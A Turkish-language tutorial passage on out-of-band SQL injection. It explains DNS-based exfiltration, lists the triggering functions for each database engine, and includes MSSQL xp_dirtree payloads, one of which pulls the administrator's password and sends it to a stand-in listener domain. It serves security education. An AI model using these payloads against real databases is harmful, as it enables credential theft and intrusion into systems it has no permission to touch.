**Bant Dışı (Out-of-Band) SQL Injection**

Bant dışı teknik, önceki tüm yöntemlerin (koşullu yanıt, koşullu hata, zaman gecikmesi) ortak bir varsayıma dayandığı noktadan başlar: uygulamanın HTTP yanıtının, enjekte edilen sorgudan **bir şekilde** etkilenmesi gerekir — ister içerik farkıyla, ister hatayla, ister süreyle. Bazı sistemlerde bu varsayım tamamen çöker: sorgu arka planda, isteğin normal akışından bağımsız bir iş parçacığında çalıştırılır. Uygulama kullanıcıya hemen yanıt döner, sorgunun sonucunu, hata verip vermediğini ya da ne kadar sürdüğünü hiçbir şekilde yansıtmaz. Bu noktada yanıt kanalı tükenmiştir; veriyi çıkarmak için **tamamen farklı bir kanal** gerekir.

Bant dışı tekniğin temel fikri şudur: veritabanı sunucusunun kendisini, saldırganın kontrolündeki bir sisteme **ağ isteği** göndermeye zorlamak, ve bu isteğin içine sızdırılmak istenen veriyi gömmek. Böylece bilgi, HTTP yanıtından değil, veritabanı sunucusunun kurduğu ayrı bir bağlantıdan elde edilir.

**Neden DNS tercih edilir**
Kurumsal ağların çoğu, giden trafiği sıkı şekilde filtreler — ama DNS sorgularını neredeyse her zaman serbest bırakır, çünkü DNS çözümlemesi sistemlerin temel işleyişi için zorunludur. Bu yüzden bir HTTP isteği engellenirken, bir DNS sorgusu genellikle ağdan sorunsuz çıkar. Bant dışı SQLi'de DNS'in en yaygın kanal olmasının nedeni budur.

**Veritabanı motoruna göre tetikleme yöntemi**
Veritabanı sunucusuna dışa dönük bir DNS sorgusu yaptırmak için kullanılan fonksiyon, motora göre değişir:

- **MSSQL** — `xp_dirtree`, `xp_fileexist` gibi genişletilmiş prosedürler, bir UNC yol (`\\...`) verildiğinde dosya sistemi erişimi gibi davranıp önce o yolun adını DNS üzerinden çözmeye çalışır
- **Oracle** — `UTL_HTTP.REQUEST` ile doğrudan bir HTTP isteği tetiklenebilir, veya `UTL_INADDR.GET_HOST_ADDRESS` ile bir alan adı çözümlemesi zorlanabilir
- **MySQL** — yerleşik desteği MSSQL/Oracle kadar doğrudan değildir; genelde `LOAD_FILE()` ile bir UNC yola erişim denemesi ya da özel kullanıcı tanımlı fonksiyonlar (UDF) gerekir, bu yüzden pratikte en az güvenilir seçenektir
- **PostgreSQL** — `dblink` uzantısı ile saldırganın sunucusuna bir bağlantı açılabilir; bu da bağlantı denemesi sırasında bir DNS çözümlemesi tetikler

Mantık her motorda aynı: normalde zararsız bir dosya/ağ erişim fonksiyonunu, saldırganın kontrolündeki bir adrese yönlendirmek.

```sql
'; exec master..xp_dirtree '//abcdefg.dinleme-sunucusu.com/a'--
```

**Veriyi sızdırma**
Sadece bir sorgu tetiklemek, zafiyeti doğrular ama veri getirmez. Veriyi de aynı kanaldan çıkarmak için, sızdırılacak değer sorgu içinde alan adının bir parçası haline getirilir:

```sql
'; declare @p varchar(1024);
   set @p=(SELECT password FROM users WHERE username='administrator');
   exec('master..xp_dirtree "//'+@p+'.dinleme-sunucusu.com/a"')--
```

Bu sorgu çalıştığında, dinleme sunucusuna gelen DNS isteği, alan adının bir parçası olarak parolayı taşır — istek kaydını incelediğinde veriyi doğrudan orada görürsün.

**Pratik bir kısıt: alan adı uzunluğu**
DNS'te tek bir etiket (nokta ile ayrılan her parça) en fazla 63 karakter, toplam alan adı ise ~253 karakter olabilir. Uzun bir değer (örneğin bir tablo dökümü) tek seferde sığmayabilir — bu durumda veri parçalara bölünür, her parça ayrı bir DNS sorgusuyla gönderilir, ya da yalnızca karakter karakter/satır satır çıkarma tercih edilir.

**Araç notu**
Bu tür istekleri yakalamak için bir "dinleme sunucusuna" ihtiyaç var — Burp Collaborator en bilinen seçenek, ama ücretsiz alternatifler de mevcut: açık kaynaklı **interactsh**, ya da tek kullanımlık **dnslog.cn** benzeri servisler aynı işi görür, Burp Suite Professional lisansı olmadan da bu teknik denenebilir.

**Neden tercih edilir**
Diğer teknikler çalışsa bile bant dışı yöntem genelde daha üstün tutulur — çünkü veriyi karakter karakter değil, doğrudan tek istekte taşıyabilir, ve uygulamanın davranışına hiçbir şekilde bağlı değildir; bu da onu en güvenilir ama en çok altyapı (dinleme sunucusu) gerektiren teknik yapar.
